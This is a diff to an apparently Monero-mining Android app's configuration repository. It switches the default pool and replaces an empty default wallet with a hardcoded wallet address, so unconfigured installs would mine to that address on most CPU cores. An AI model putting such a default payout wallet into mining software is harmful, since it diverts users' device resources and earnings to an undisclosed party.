@@ -30,8 +30,8 @@ class ConfigRepository @Inject constructor(
 
     fun getConfig(): Flow<MiningConfig> = context.dataStore.data.map { prefs ->
         MiningConfig(
-            poolUrl = prefs[Keys.POOL_URL] ?: "pool.supportxmr.com:3333",
-            walletAddress = prefs[Keys.WALLET_ADDRESS] ?: "",
+            poolUrl = prefs[Keys.POOL_URL] ?: "gulf.moneroocean.stream:10128",
+            walletAddress = prefs[Keys.WALLET_ADDRESS] ?: "8AfUwcnoJiRDMXnDGj3zX6bMgfaj9pM1WFGr2pakLm3jSYXVLD5fcDMBzkmk4AeSqWYQTA5aerXJ43W65AT82RMqG6NDBnC",
             workerName = prefs[Keys.WORKER_NAME] ?: "android",
             threads = prefs[Keys.THREADS] ?: (Runtime.getRuntime().availableProcessors() - 1),
             maxCpuUsage = prefs[Keys.MAX_CPU_USAGE] ?: 75,
